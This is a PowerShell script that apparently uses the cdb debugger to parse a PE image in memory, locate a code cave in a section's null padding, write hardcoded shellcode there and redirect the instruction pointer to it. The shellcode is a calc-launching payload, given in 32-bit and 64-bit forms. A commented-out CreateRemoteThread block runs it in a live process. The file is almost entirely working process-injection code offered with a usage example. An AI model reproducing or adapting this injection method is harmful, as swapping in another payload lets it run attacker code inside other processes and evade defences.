<#
.SYNOPSIS 
    Parse a PE loaded in memory, inject a payload and call it
 
.DESCRIPTION 
    Play with the memory of PE

.EXAMPLE 
PS > Inject-Process.ps1 -ProcessName calc.exe

.Note    

#>


[CmdletBinding()]
param (
    [Parameter(Mandatory=$false, ValueFromPipelineByPropertyName=$true, Position=0)]        
    [string] $ProcessName
)
#---------------------------------------------------------[Initialisations]--------------------------------------------------------

Set-StrictMode -version 2

$scriptPath = split-path -parent $MyInvocation.MyCommand.Definition
$scriptParentPath = split-path -parent $scriptPath
$scriptFile = $MyInvocation.MyCommand.Definition
$launchDate = get-date -f "yyyyMMddHHmmss"
$logDirectoryPath = $scriptPath + "\" + $launchDate
$file = "$logDirectoryPath\winmine.dmp"
$buffer = "$scriptPath\bufferCommand.txt"
$fullScriptPath = (Resolve-Path -Path $buffer).Path

#----------------------------------------------------------[Declarations]----------------------------------------------------------

$symbols = "srv*c:\symbols*http://msdl.microsoft.com/download/symbols"
$utilityFunctions = "$scriptPath\Get-Utilities.ps1"

#----------------------------------------------------------[Functions]-------------------------------------------------------------

. $utilityFunctions

#----------------------------------------------------------[Execution]-------------------------------------------------------------

$operatingSystem = (Get-WmiObject Win32_OperatingSystem).version
$osArchitecture =  (Get-WmiObject Win32_OperatingSystem).OSArchitecture

$mode = Get-OperatingSystemMode $operatingSystem $osArchitecture

Switch ($mode) {
    "1" { 
            $memoryWalker = "$scriptPath\debugger\x64\cdb.exe"
        }
    "132" { 
            $memoryWalker = "$scriptPath\debugger\pre2r2\cdb.exe"
        }
    "2" { 
            $memoryWalker = "$scriptPath\debugger\x64\cdb.exe"
        }
    "8.1" {
            $memoryWalker = "$scriptPath\debugger\x64\cdb.exe"
        }
    "2r2" {
            $memoryWalker = "$scriptPath\debugger\x64\cdb.exe"
        }
    "232" {
            $memoryWalker = "$scriptPath\debugger\x64\cdb.exe"
        }
    "2016" { 
            $memoryWalker = "$scriptPath\debugger\x64\cdb.exe"
        }
}

Clear-Host
Write-Output "================================================================================================"
White-Rabbit

Write-Output "`n$ProcessName Analyzing...`n"

$chain = "lm"
Write-InFile $buffer "$chain"
$tabSystem = Call-UserLandMemoryWalker $memoryWalker $file $fullScriptPath $symbols
$tabFA = ($tabSystem -split ' ')                   
$fi = [array]::indexof($tabFA,"module") + 2
$startModuleAddress = $tabFA[$fi]

$chain = "dd $startModuleAddress+3C L1"
Write-InFile $buffer "$chain"
$tabSystem = Call-UserLandMemoryWalker $memoryWalker $file $fullScriptPath $symbols
$tabFA = ($tabSystem -split ' ')                   
$fi = [array]::indexof($tabFA,"dd") + 5
$PEHeaderOffset = $tabFA[$fi]
Write-Output "PE Header offset: 
$PEHeaderOffset"

$chain = ".formats $startModuleAddress+$PEHeaderOffset"
Write-InFile $buffer "$chain"
$tabSystem = Call-UserLandMemoryWalker $memoryWalker $file $fullScriptPath $symbols
$tabFA = ($tabSystem -split ' ')                   
$fi = [array]::indexof($tabFA,"Hex:") + 5
$PEHeaderAddress = $tabFA[$fi]
Write-Output "PE Header address: 
$PEHeaderAddress"

# https://msdn.microsoft.com/en-us/library/windows/desktop/ms680313(v=vs.85).aspx
$chain = "db $PEHeaderAddress L18" # PE Header is 24 bytes
Write-InFile $buffer "$chain"
$tabSystem = Call-UserLandMemoryWalker $memoryWalker $file $fullScriptPath $symbols
$tabFA = ($tabSystem -split ' ')  
$PEHeader = ""

$j = 5
while ($j -le 31) {                 
    if($j -eq 19) {
        $j = $j+4
    }
    $fi = [array]::indexof($tabFA,"db") + $j
    $PEHeader += " $($tabFA[$fi])"
    $j++
}

$PEHeader = $PEHeader -replace ("  ", ' ') 
$PEHeader = $PEHeader -replace ("-", ' ') 

$hexEcho = "0x" + $($PEHeader.Substring(34,2)) + $($PEHeader.Substring(31,2)) + $($PEHeader.Substring(28,2)) + $($PEHeader.Substring(25,2))
[int32]$hexToIntEcho = $hexEcho
$dateFileCreated = Convert-EchoTime -EchoTime $hexToIntEcho

$machineType = "0x$($PEHeader.Substring(16,2))$($PEHeader.Substring(13,2))"
Switch($machineType) {
    "0x014c" {
        $machineType = "i386+"
    }      
    "0x0200" {
        $machineType = "Intel Itanium"
    }      
    "0x8664" {
        $machineType = "x64"
    }    
}

$optionalHeaderSizeHex = "0x$($PEHeader.Substring(61,2))$($PEHeader.Substring(58,2))"
[int32]$optionalHeaderSizeDec = $optionalHeaderSizeHex

# 818f Relocs Stripped, Executable, Line Numbers Stripped, Local Symbols Stripped, Bytes Reversed Lo, Bytes Reversed Hi, 32bit Machine Expected

Write-Output "PE Header: 
$PEHeader"
Write-Output "PE Signature: 
$($PEHeader.Substring(1,11))"
Write-Output "Machine Type: 
0x$($PEHeader.Substring(16,2))$($PEHeader.Substring(13,2)) - $machineType"
Write-Output "Number of sections: 
$($PEHeader.Substring(19,5))"
Write-Output "Time Date stamp: 
$hexEcho - $dateFileCreated"
Write-Output "Optional Header Size: 
$($PEHeader.Substring(58,5)) - $optionalHeaderSizeDec"
Write-Output "Charasteristics: 
$($PEHeader.Substring(64,5))"

$chain = ".formats $PEHeaderAddress+18"
Write-InFile $buffer "$chain"
$tabSystem = Call-UserLandMemoryWalker $memoryWalker $file $fullScriptPath $symbols
$tabFA = ($tabSystem -split ' ')                   
$fi = [array]::indexof($tabFA,"Hex:") + 5
$OptionalHeaderAddress = $tabFA[$fi]
Write-Output "Optional Header address: 
$OptionalHeaderAddress"

$chain = "db $OptionalHeaderAddress L$optionalHeaderSizeHex" 
Write-InFile $buffer "$chain"
$tabSystem = Call-UserLandMemoryWalker $memoryWalker $file $fullScriptPath $symbols
$tabFA = ($tabSystem -split ' ')  
$optionalHeader = ""
$j = 5
$passRow = 1
$limit = $optionalHeaderSizeDec

$optionalHeader = Construc-Structure -Limit $limit -Array $tabFA -Index $j -Step $passRow -Pattern "db"

$magicNumber = "0x" + $($optionalHeader.Substring(4,2)) + $($optionalHeader.Substring(1,2))

Switch($magicNumber) {
    "0x010b" {
        $magicNumber = "PE32"
    }      
    "0x020b" {
        $magicNumber = "PE32+"
    }      
}

$entryPoint = $($optionalHeader.Substring(50,11)) # Optional Header address + 20 bytes
$entryPointAddress = "0x" + $($optionalHeader.Substring(59,2)) + $($optionalHeader.Substring(56,2)) + $($optionalHeader.Substring(53,2)) + $($optionalHeader.Substring(50,2))

$optionalHeader = $optionalHeader -replace ("  ", ' ') 
$optionalHeader = $optionalHeader -replace ("-", ' ') 
Write-Output "`nOptional Header: 
$optionalHeader"
Write-Output "Magic Number: 
$magicNumber"
Write-Output "Code: 
$($optionalHeader.Substring(13,11))" # Size's sum of all codes sections
Write-Output "Initialised: 
$($optionalHeader.Substring(25,11))" # Size's sum of all initialised data sections
Write-Output "Entry Point: 
$entryPoint - $entryPointAddress" # Entry Point offset
Write-Output "Base Of Code: 
$($optionalHeader.Substring(61,11))" # Code section relative to image base
Write-Output "Base Of Data: 
$($optionalHeader.Substring(73,11))" # Data section relative to image base
Write-Output "Image Base: 
$($optionalHeader.Substring(85,11))" # Preferred image base
Write-Output "Image Size : 
$($optionalHeader.Substring(169,11))" # Image size including headers
Write-Output "Header Size: 
$($optionalHeader.Substring(181,11))" # Combined size of headers
Write-Output "Subsystem Type: 
$($optionalHeader.Substring(205,5))" # Sub-system required for PE

$chain = "db $optionalHeaderAddress+$optionalHeaderSizeHex L28" 
Write-InFile $buffer "$chain"
$tabSystem = Call-UserLandMemoryWalker $memoryWalker $file $fullScriptPath $symbols
$tabFA = ($tabSystem -split ' ')  
$sectionTable = ""
$j = 5
$passRow = 1
$limit = 40

$sectionTable = Construc-Structure -Limit $limit -Array $tabFA -Index $j -Step $passRow -Pattern "db"

$sectionTable = $sectionTable -replace ("  ", ' ') 
$sectionTable = $sectionTable -replace ("-", ' ') 
Write-Output "`nSection Table: 
$sectionTable"

$hex = $($sectionTable.Substring(1,23)) -split (" ")
$sectionName ="" 
foreach ($h in $hex){
$asciiCodeSplittedInteger = [Convert]::ToInt32($h, 16)
$sectionName += $([char]$asciiCodeSplittedInteger)
}

$virtualSizeInt = [int32] "0x$($sectionTable.Substring(34,2))$($sectionTable.Substring(31,2))$($sectionTable.Substring(28,2))$($sectionTable.Substring(25,2))"
$virtualSize = "0x$($sectionTable.Substring(34,2))$($sectionTable.Substring(31,2))$($sectionTable.Substring(28,2))$($sectionTable.Substring(25,2))"
$virtualAddressInt = [int32] "0x$($sectionTable.Substring(46,2))$($sectionTable.Substring(43,2))$($sectionTable.Substring(40,2))$($sectionTable.Substring(37,2))"
$virtualAddress = "0x$($sectionTable.Substring(46,2))$($sectionTable.Substring(43,2))$($sectionTable.Substring(40,2))$($sectionTable.Substring(37,2))"
$rawDataSizeInt = [int32] "0x$($sectionTable.Substring(58,2))$($sectionTable.Substring(55,2))$($sectionTable.Substring(52,2))$($sectionTable.Substring(49,2))"
$rawDataPointerInt = [int32] "0x$($sectionTable.Substring(70,2))$($sectionTable.Substring(67,2))$($sectionTable.Substring(64,2))$($sectionTable.Substring(61,2))"
$rawDataPointer = "0x$($sectionTable.Substring(70,2))$($sectionTable.Substring(67,2))$($sectionTable.Substring(64,2))$($sectionTable.Substring(61,2))"

Write-Output "Section Name: 
$($sectionTable.Substring(1,23)) - $sectionName"
Write-Output "Virtual Size: 
$($sectionTable.Substring(25,12)) - $virtualSize - $virtualSizeInt"
Write-Output "Virtual Address: 
$($sectionTable.Substring(37,12)) - $virtualAddress - $virtualAddressInt"
Write-Output "Raw Data Size: 
$($sectionTable.Substring(49,12)) - $rawDataSizeInt"
Write-Output "Raw Data Pointer: 
$($sectionTable.Substring(61,12)) - $rawDataPointer - $rawDataPointerInt"
Write-Output "Section Flags: 
$($sectionTable.Substring(109,12))"

$nullPadding = '{0:X8}' -f ($virtualSizeInt + $virtualAddressInt)
Write-Output "Null Padding: $nullPadding"

$shellCodeWrite = (($virtualSizeInt + $virtualAddressInt) - ($virtualAddressInt - $rawDataPointerInt))
$chain = ".formats $startModuleAddress+0x$shellCodeWrite"
Write-InFile $buffer "$chain"
$tabSystem = Call-UserLandMemoryWalker $memoryWalker $file $fullScriptPath $symbols
$tabFA = ($tabSystem -split ' ')                   
$fi = [array]::indexof($tabFA,"Hex:") + 5
$shellCodeAddress = $tabFA[$fi]
Write-Output "Shell Code address: 
$shellCodeAddress"

$chain = "db $startModuleAddress+0x$nullPadding L117"
Write-InFile $buffer "$chain"
$tabSystem = Call-UserLandMemoryWalker $memoryWalker $file $fullScriptPath $symbols
$tabFA = ($tabSystem -split ' ') 
$nullPaddingBefore = ""
$j = 5
$passRow = 1
$limit = 512

$nullPaddingBefore = Construc-Structure -Limit $limit -Array $tabFA -Index $j -Step $passRow -Pattern "db"

$nullPaddingBefore = $nullPaddingBefore -replace ("  ", ' ') 
$nullPaddingBefore = $nullPaddingBefore -replace ("-", ' ') 
$nullPaddingBefore

# 32 bits : fc e8 89 00 00 00 60 89 e5 31 d2 64 8b 52 30 8b 52 0c 8b 52 14 8b 72 28 0f b7 4a 26 31 ff 31 c0 ac 3c 61 7c 02 2c 20 c1 cf 0d 01 c7 e2 f0 52 57 8b 52 10 8b 42 3c 01 d0 8b 40 78 85 c0 74 4a 01 d0 50 8b 48 18 8b 58 20 01 d3 e3 3c 49 8b 34 8b 01 d6 31 ff 31 c0 ac c1 cf 0d 01 c7 38 e0 75 f4 03 7d f8 3b 7d 24 75 e2 58 8b 58 24 01 d3 66 8b 0c 4b 8b 58 1c 01 d3 8b 04 8b 01 d0 89 44 24 24 5b 5b 61 59 5a 51 ff e0 58 5f 5a 8b 12 eb 86 5d 6a 01 8d 85 b9 00 00 00 50 68 31 8b 6f 87 ff d5 bb e0 1d 2a 0a 68 a6 95 bd 9d ff d5 3c 06 7c 0a 80 fb e0 75 05 bb 47 13 72 6f 6a 00 53 ff d5 63 6d 64 20 2f 6b 20 63 61 6c 63 00
# 64 bits : fc 48 83 e4 f0 e8 c0 00 00 00 41 51 41 50 52 51 56 48 31 d2 65 48 8b 52 60 48 8b 52 18 48 8b 52 20 48 8b 72 50 48 0f b7 4a 4a 4d 31 c9 48 31 c0 ac 3c 61 7c 02 2c 20 41 c1 c9 0d 41 01 c1 e2 ed 52 41 51 48 8b 52 20 8b 42 3c 48 01 d0 8b 80 88 00 00 00 48 85 c0 74 67 48 01 d0 50 8b 48 18 44 8b 40 20 49 01 d0 e3 56 48 ff c9 41 8b 34 88 48 01 d6 4d 31 c9 48 31 c0 ac 41 c1 c9 0d 41 01 c1 38 e0 75 f1 4c 03 4c 24 08 45 39 d1 75 d8 58 44 8b 40 24 49 01 d0 66 41 8b 0c 48 44 8b 40 1c 49 01 d0 41 8b 04 88 48 01 d0 41 58 41 58 5e 59 5a 41 58 41 59 41 5a 48 83 ec 20 41 52 ff e0 58 41 59 5a 48 8b 12 e9 57 ff ff ff 5d 48 ba 01 00 00 00 00 00 00 00 48 8d 8d 01 01 00 00 41 ba 31 8b 6f 87 ff d5 bb e0 1d 2a 0a 41 ba a6 95 bd 9d ff d5 48 83 c4 28 3c 06 7c 0a 80 fb e0 75 05 bb 47 13 72 6f 6a 00 59 41 89 da ff d5 63 6d 64 20 2f 6b 20 63 61 6c 63 00"
# size of sc = 279 in dec and 117 in hex
$chain = "f $startModuleAddress+0x$nullPadding L117 fc 48 83 e4 f0 e8 c0 00 00 00 41 51 41 50 52 51 56 48 31 d2 65 48 8b 52 60 48 8b 52 18 48 8b 52 20 48 8b 72 50 48 0f b7 4a 4a 4d 31 c9 48 31 c0 ac 3c 61 7c 02 2c 20 41 c1 c9 0d 41 01 c1 e2 ed 52 41 51 48 8b 52 20 8b 42 3c 48 01 d0 8b 80 88 00 00 00 48 85 c0 74 67 48 01 d0 50 8b 48 18 44 8b 40 20 49 01 d0 e3 56 48 ff c9 41 8b 34 88 48 01 d6 4d 31 c9 48 31 c0 ac 41 c1 c9 0d 41 01 c1 38 e0 75 f1 4c 03 4c 24 08 45 39 d1 75 d8 58 44 8b 40 24 49 01 d0 66 41 8b 0c 48 44 8b 40 1c 49 01 d0 41 8b 04 88 48 01 d0 41 58 41 58 5e 59 5a 41 58 41 59 41 5a 48 83 ec 20 41 52 ff e0 58 41 59 5a 48 8b 12 e9 57 ff ff ff 5d 48 ba 01 00 00 00 00 00 00 00 48 8d 8d 01 01 00 00 41 ba 31 8b 6f 87 ff d5 bb e0 1d 2a 0a 41 ba a6 95 bd 9d ff d5 48 83 c4 28 3c 06 7c 0a 80 fb e0 75 05 bb 47 13 72 6f 6a 00 59 41 89 da ff d5 63 6d 64 20 2f 6b 20 63 61 6c 63 00"
Write-InFile $buffer "$chain"
$tabSystem = Call-UserLandMemoryWalker $memoryWalker $file $fullScriptPath $symbols

$chain = "db $OptionalHeaderAddress+10 L4"
Write-InFile $buffer "$chain"
$tabSystem = Call-UserLandMemoryWalker $memoryWalker $file $fullScriptPath $symbols
$tabFA = ($tabSystem -split ' ')                   
$fi = [array]::indexof($tabFA,"db") + 3
$entryPointAddress = $tabFA[$fi]

$chain = ".formats $startModuleAddress+0x$nullPadding"
Write-InFile $buffer "$chain"
$tabSystem = Call-UserLandMemoryWalker $memoryWalker $file $fullScriptPath $symbols
$tabFA = ($tabSystem -split ' ')                   
$fi = [array]::indexof($tabFA,"Hex:") + 5
$moduleAddress = $tabFA[$fi]
Write-Output "Null Padding address: 
$moduleAddress"

<#
$chain = "f $entryPointAddress L4 $($nullPadding.Substring(0,2)) $($nullPadding.Substring(2,2)) $($nullPadding.Substring(4,2)) $($nullPadding.Substring(6,2))"
Write-InFile $buffer "$chain"
$tabSystem = Call-UserLandMemoryWalker $memoryWalker $file $fullScriptPath $symbols
#>
<#
$Win32API = @"
[DllImport("kernel32.dll")]
public static extern IntPtr CreateRemoteThread(IntPtr hProcess, uint lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
"@
$winAPIFunc = Add-Type -memberDefinition $Win32API -Name "Win32" -namespace Win32API -passthru

$moduleAddress = $moduleAddress -replace ("``", '')
[int64]$test = "0x$moduleAddress"

$processNameFirst = $ProcessName.Split(".")
$process = Get-Process $processNameFirst[0]

$winAPIFunc::CreateRemoteThread($process.Handle,0,0,$test,0,0,0)
#>
$chain = "r @rip=0x$moduleAddress"
Write-InFile $buffer "$chain"
$tabSystem = Call-UserLandMemoryWalker $memoryWalker $file $fullScriptPath $symbols


Stop-Script